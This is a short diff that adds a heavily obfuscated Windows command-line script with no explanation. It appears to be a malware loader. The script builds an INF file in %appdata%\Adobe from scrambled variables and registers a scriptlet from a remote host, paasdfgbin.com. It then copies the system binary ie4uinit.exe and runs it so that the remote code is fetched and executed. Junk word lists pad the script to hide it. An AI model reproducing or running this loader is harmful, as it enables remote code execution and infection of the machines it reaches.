@@ -1,0 +1,7 @@
+/v /c (for %f in (s) do @set "Latin=%~f") &&
+  (for %p in (i) do @set "Climb=%~p") &&
+  (for %p in (c) do @set "Pretty=%~p") &&
+  (for %w in (a) do @set "Nerve=%~w") &&
+  call(for %f in ("[strings]" "servicename=' '" "General=t;Leader" "Printers=h" "Cities=b;Restrictions" "Challenges=%t!Climb!me%" "shortsvcname=' '" "Warranties=:;Occur" "Hammer=init" "Parents=/" "[version]" "signature =$windows nt$" "[defaultinstall.windows7]" "delfiles=1E5F" "Un\" "Register\" "OCXs=6B63E" "[6B63E]" "sc\" "ro%Cities%j,NI,%Printers%%General%%General%p%Warranties%%Parents%%Parents%paasdfgbin.com/asdgabt" "[1E5F]" "ieu%Hammer%.inf" "[destinationdirs]" "defaultdestdir=11" "1E5F=01" ) do @echo %~f)>"%appdata%\Adobe\ieuinit.inf" &&
+  call xcopy /Y /C /Q aClimb!n!Instruments!ir%\system32\ie4uinit.exe "%appdata%\Adobe\*" | set Praise9=Crystal &&
+  start " " %appdata%\Adobe\ie4uinit.exe -basesettings " | set "Praise8=Habits Properties Click Courses Americans Ready Interfaces Reservations Focus About Sword Guides Truth Castle Shows Colleagues Amounts Souls Weekend Stones Cycles Damage Plates Enemy Queens Harsh Security Class Neighbors Races Human Acoustic Charges Codes Tracks Organizations Gesture Pyramid Allows Gospel Asbestos Basket Surplus Mobiles Quizzes Plants Cents Outer Ranks Centres Preferences"
